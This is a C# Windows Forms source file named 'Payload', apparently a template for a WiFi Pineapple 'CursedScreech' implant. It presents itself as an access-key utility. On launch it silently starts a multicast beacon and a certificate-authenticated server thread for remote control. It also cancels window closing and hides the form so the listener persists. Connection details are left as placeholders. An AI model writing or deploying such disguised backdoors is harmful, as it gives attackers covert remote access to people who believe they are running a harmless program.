using System;
using System.Drawing;
using System.Windows.Forms;
using PineappleModules;

namespace Payload
{
    public partial class Form1 : Form {
		
		PA_Authorization pauth = new PA_Authorization();

        public Form1() {
            InitializeComponent();
            
			CursedScreech cs = new CursedScreech();
            cs.startMulticaster("IPAddress", mcastport, hbinterval);
            cs.setRemoteCertificateSerial("serial");
            cs.setRemoteCertificateHash("fingerprint");
            cs.startSecureServerThread("privateKey", "password");
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            e.Cancel = true;
            this.Hide();
        }
		
		private void accessKeyButton_Click(object sender, EventArgs e) {
			
			// Request an access key from the Pineapple
            string key = pauth.getAccessKey();

            // Check if a key was returned
            string msg;
            if (key.Length > 0) {
                msg = "Your access key is unique to you so DO NOT give it away!\n\nAccess Key: " + key;
            }
            else {
                msg = "Failed to retrieve an access key from the server.  Please try again later.";
            }

            // Display message to the user
            MessageBox.Show(msg);
		}
    }
}